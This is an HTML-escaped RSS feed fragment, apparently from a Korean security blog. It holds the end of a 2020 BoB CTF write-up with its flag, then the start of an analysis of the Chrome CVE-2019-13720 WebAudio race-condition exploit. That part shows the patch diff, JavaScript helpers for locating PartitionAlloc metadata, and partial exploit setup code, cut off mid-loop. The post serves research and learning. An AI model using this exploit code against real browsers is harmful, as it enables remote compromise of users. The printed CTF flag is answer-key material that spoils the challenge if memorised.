&lt;/p&gt;&lt;figure id=&quot;e59f2ccc-bc2a-4d20-9beb-6dc130f3ceb8&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob9100.png&quot;&gt;&lt;img style=&quot;width:347px&quot; src=&quot;/assets/bob/bob9100.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;67c19fe9-d9a9-4cb9-adba-1c16ff61dd38&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì–»ì–´ë‚¸ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;922be427-0f66-4cdb-9f37-05b13f509893&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;FLAG : &lt;mark class=&quot;highlight-yellow_background&quot;&gt;bob{royal_macaron_is_very_tasty_you_know?}&lt;/mark&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;19212645-2896-4eb5-9f09-f72cd54cb3ff&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;ff941ff8-f7db-494f-8b4e-fd5980312dd3&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;ad0164f6-644f-406a-89a9-da90dce5c0d5&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;0f096dd6-b935-4559-863c-617aaa36af19&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;cf559a41-4963-48cc-a198-e7a249c682e1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;042fc6a6-6f2a-4203-86ba-b252ec702edf&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;/div&gt;&lt;/article&gt;&lt;/body&gt;&lt;/html&gt;</description>
        <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-09-01/2020-BoB-CTF-Write-up-2</link>
        <guid isPermaLink="true">http://localhost:4000/2020-09-01/2020-BoB-CTF-Write-up-2</guid>
        
        <category>write-up</category>
        
        <category>ctf</category>
        
        
      </item>
    
      <item>
        <title>chrome CVE-2019-13720 exploit</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì´ì˜ì£¼&lt;/p&gt;

&lt;h1 id=&quot;1-intro&quot;&gt;1. Intro&lt;/h1&gt;

&lt;p&gt;ì´ ì·¨ì•½ì ì€ ë¶í•œ ë‰´ìŠ¤ ì‚¬ì´íŠ¸ì—ì„œ ì‚¬ìš©ëœ 0day exploitì—ì„œ ë°œê²¬í•œ ì·¨ì•½ì ì´ë¼ê³  í•©ë‹ˆë‹¤. ì €ëŠ” &lt;a href=&quot;https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/&quot;&gt;https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/&lt;/a&gt; ì´ê³³ì˜ ë‚´ìš©ì„ ì‰½ê²Œ ì½ì„ ìˆ˜ ìˆë„ë¡ ì •ë¦¬í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-exploit&quot;&gt;2. Exploit&lt;/h1&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Obtain graph/process lock when nullifying the buffer in Reverb

When the buffer is set to `null` while there is an active buffer
within a reverb object, SetBuffer() function can prematurely
nullify the `reverb_` and `shared_buffer_` while it is still
being accessed by the rendering thread.

This CL adds two locks (graph lock and process lock) when the
buffer gets nullified to ensure the synchronization between
two threads.

Change-Id: I8f501b6a16b3c7e16db767e0b279a1a53d6eb290
Bug: 1019226
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1888103
Commit-Queue: Hongchan Choi &amp;lt;hongchan@chromium.org&amp;gt;
Reviewed-by: Robert Sesek &amp;lt;rsesek@chromium.org&amp;gt;
Cr-Commit-Position: refs/heads/master@{#710627}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì·¨ì•½ì ì€ race-conditionì´ë©° ì·¨ì•½ì ì€ í¬ë¡¬ 78.0.3904.87ì—ì„œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. íŒ¨ì¹˜ëœ ì»¤ë°‹ì€ ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/third_party/blink/renderer/modules/webaudio/convolver_node.cc b/third_party/blink/renderer/modules/webaudio/convolver_node.cc
index c67a0ba..ce19fe6 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/third_party/blink/renderer/modules/webaudio/convolver_node.cc
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/third_party/blink/renderer/modules/webaudio/convolver_node.cc
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -103,6 +103,8 @@&lt;/span&gt;
   DCHECK(IsMainThread());
 
   if (!buffer) {
&lt;span class=&quot;gi&quot;&gt;+    BaseAudioContext::GraphAutoLocker context_locker(Context());
+    MutexLocker locker(process_lock_);
&lt;/span&gt;     reverb_.reset();
     shared_buffer_ = nullptr;
     return;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MODULES_EXPORT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConvolverHandler&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AudioHandler&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_ptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Reverb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverb_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_ptr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedAudioBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shared_buffer_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;íŒ¨ì¹˜ëœ ë‚´ìš©ì€ ë‹¨ ë‘ì¤„ì¸ë°, íŒ¨ì¹˜ëœ ê¸°ëŠ¥ì€ ConvolverNodeì—ì„œ audio bufferê°€ nullì´ë¼ë©´ reverb_ ê°ì²´ì™€ shared_buffer_ ê°ì²´ë¥¼ freeí•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ì´ê³³ì— ìŠ¤ë ˆë“œ ë™ê¸°í™”ì— ê´€í•œ ì½”ë“œê°€ ì—†ê¸° ë•Œë¬¸ì— freeëœ ì´í›„ì—ë„ ê°ì²´ê°€ ë‹¤ë¥¸ ìŠ¤ë ˆë“œì—ì„œ ì‚¬ìš©ë˜ê³  ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ íŒ¨ì¹˜ëŠ” raceë¥¼ ë°©ì§€í•˜ëŠ” mutexê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSuperPageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageOffsetMask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBaseMask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;superPageOffsetMask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBaseMask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPartitionPageBaseWithinSuperPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSuperPageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finalAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finalAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPartitionPageIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageOffsetMask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageOffsetMask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getMetadataAreaBaseFromPartitionSuperPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSuperPageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;systemPageSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;systemPageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPartitionPageMetadataArea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageOffsetMask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;superPageOffsetMask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageMetadataSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageMetadataPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getMetadataAreaBaseFromPartitionSuperPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pageMetadataSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageMetadataPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì·¨ì•½ì ì—ì„œ í•µì‹¬ì ì¸ ë‚´ìš©ì€ PartitionAllocì˜ chunkë¥¼ exploit í–ˆë‹¤ëŠ” ì ì¸ë°, ì˜ˆì „ì—ëŠ” ì´ allocatorì—ì„œ ì·¨ì•½ì ì´ ë°œìƒí–ˆë‹¤ë©´ exploit í•˜ëŠ”ê²Œ ê±°ì˜ ë¶ˆê°€ëŠ¥í•˜ë‹¤ê³  íŒë‹¨í–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ìµœê·¼ì— ê³µê°œëœ ì—¬ëŸ¬ ìë£Œì— ì„œ PartitionAlloc chunkë„ exploití•  ìˆ˜ ìˆëŠ” ê¸°ë²•ì´ ì•Œë ¤ì¡Œê³  ì´ exploitë„ ê·¸ëŸ° ì¢…ë¥˜ì¤‘ì— í•˜ë‚˜ì…ë‹ˆë‹¤.
êµ¬ê¸€ë„ ì´ ì‚¬ì‹¤ì„ ì¸ì§€í•˜ê³ ìˆê³  ì´ ë¬¸ì œë¥¼ í•´ê²°í•  ë°©ë²•ì„ ì°¾ê³ ìˆëŠ”ê±¸ë¡œ ì•Œê³ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gcPreventer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;initialSetup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OfflineAudioContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;feedForward&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Float64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;feedback&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Float64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;feedback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;feedForward&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;feedForward&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
